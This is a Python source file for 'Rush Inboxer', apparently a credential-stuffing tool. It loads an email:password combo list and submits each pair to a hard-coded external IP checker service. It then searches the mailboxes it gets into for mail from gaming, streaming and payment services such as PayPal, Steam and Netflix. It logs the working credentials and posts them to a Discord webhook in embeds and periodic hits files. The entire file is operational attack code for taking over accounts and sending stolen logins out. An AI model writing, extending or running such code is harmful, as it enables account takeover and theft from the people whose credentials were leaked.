import requests
import json
import os
from datetime import datetime
from colorama import Fore, Style
from utils.webhook import DiscordWebhook

class RushInboxer:
    def __init__(self, config):
        self.config = config
        self.webhook = DiscordWebhook(config.get('webhook_url'))
        self.hits = []
        self.services = {
            'roblox': ['@roblox.com'],
            'nintendo': ['@nintendo.com'],
            'ubisoft': ['@ubisoft.com'],
            'epic': ['@epicgames.com'],
            'steam': ['@steampowered.com'],
            'xbox': ['@xbox.com'],
            'crunchyroll': ['@crunchyroll.com'],
            'paypal': ['@paypal.com'],
            'paysafecard': ['@paysafecard.com'],
            'disney': ['@disney.com', '@disneyplus.com'],
            'netflix': ['@netflix.com'],
            'valorant': ['@riotgames.com'],
            'ea': ['@ea.com'],
            'origin': ['@origin.com']
        }
        self.counters = {service: 0 for service in self.services.keys()}
        self.setup_directories()

    def setup_directories(self):
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.results_dir = f"results/inboxer_{self.timestamp}"
        os.makedirs(self.results_dir, exist_ok=True)
        for service in self.services.keys():
            open(os.path.join(self.results_dir, f"{service}.txt"), 'w').close()

    def clark(self, email, password):
        json_data = {
            "email": email,
            "pass": password
        }
        return requests.post("http://134.255.218.89:6969/check", json=json_data)

    def create_embed(self, email, password, found_services):
        embed = {
            "title": "🎯 New Inbox Hit Found!",
            "description": f"**Account Details:**\n`{email}:{password}`",
            "color": 0x00ff00,
            "fields": [],
            "footer": {
                "text": f"Rush Inboxer • {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            }
        }

        services_field = {
            "name": "📧 Services Found",
            "value": "",
            "inline": False
        }

        for service, count in found_services.items():
            if count > 0:
                services_field["value"] += f"**{service.upper()}:** {count} emails\n"

        embed["fields"].append(services_field)
        return embed

    def process_emails(self, email, password, response):
        try:
            email_data = json.loads(response.text)
            found_services = {}
            
            for service, domains in self.services.items():
                count = 0
                for email_entry in email_data:
                    sender = email_entry.get('from', '').lower()
                    for domain in domains:
                        if domain.lower() in sender:
                            count += 1
                
                if count > 0:
                    self.counters[service] += count
                    found_services[service] = count
                    self.save_hit(service, email, password, count)

            if found_services:
                services_str = " | ".join([f"{s.upper()}:{c}" for s, c in found_services.items()])
                print(f"{Fore.GREEN}[HIT] {email}:{password} | {services_str}{Style.RESET_ALL}")
                
                # Send to Discord
                embed = self.create_embed(email, password, found_services)
                self.webhook.send_message(embeds=[embed])
                
                # Add to hits collection
                self.hits.append({
                    'email': email,
                    'password': password,
                    'services': found_services,
                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                })
                
                # Send hits file if threshold reached
                if len(self.hits) % 10 == 0:  # Every 10 hits
                    self.send_hits_file()
                
        except json.JSONDecodeError:
            print(f"{Fore.RED}[ERROR] Invalid API response format{Style.RESET_ALL}")

    def save_hit(self, service, email, password, count):
        filepath = os.path.join(self.results_dir, f"{service}.txt")
        with open(filepath, 'a') as f:
            f.write(f"{email}:{password} | Emails found: {count}\n")

    def send_hits_file(self):
        hits_content = ""
        for hit in self.hits:
            services_str = " | ".join([f"{s.upper()}:{c}" for s, c in hit['services'].items()])
            hits_content += f"{hit['timestamp']} | {hit['email']}:{hit['password']} | {services_str}\n"

        self.webhook.send_file(
            content="📊 Current Hits Summary",
            file=hits_content.encode(),
            filename=f"hits_{self.timestamp}.txt"
        )

    def print_results(self):
        print(f"\n{Fore.CYAN}═══ Final Results ═══{Style.RESET_ALL}")
        for service, count in self.counters.items():
            if count > 0:
                print(f"{Fore.GREEN}{service.upper()}: {count} emails found{Style.RESET_ALL}")

    def start(self):
        combo_file = input(f"{Fore.CYAN}Enter combo file path: {Style.RESET_ALL}")
        
        try:
            with open(combo_file, 'r') as f:
                combos = [line.strip() for line in f if ':' in line]

            print(f"\n{Fore.CYAN}[+] Loaded {len(combos)} combos{Style.RESET_ALL}")
            
            for combo in combos:
                email, password = combo.split(':')
                response = self.clark(email, password)
                
                if "success" in response.text.lower():
                    self.process_emails(email, password, response)
                else:
                    print(f"{Fore.RED}[FAIL] {email}:{password}{Style.RESET_ALL}")

            self.print_results()
            self.send_hits_file()  # Send final summary
            
        except FileNotFoundError:
            print(f"{Fore.RED}[ERROR] Combo file not found!{Style.RESET_ALL}")
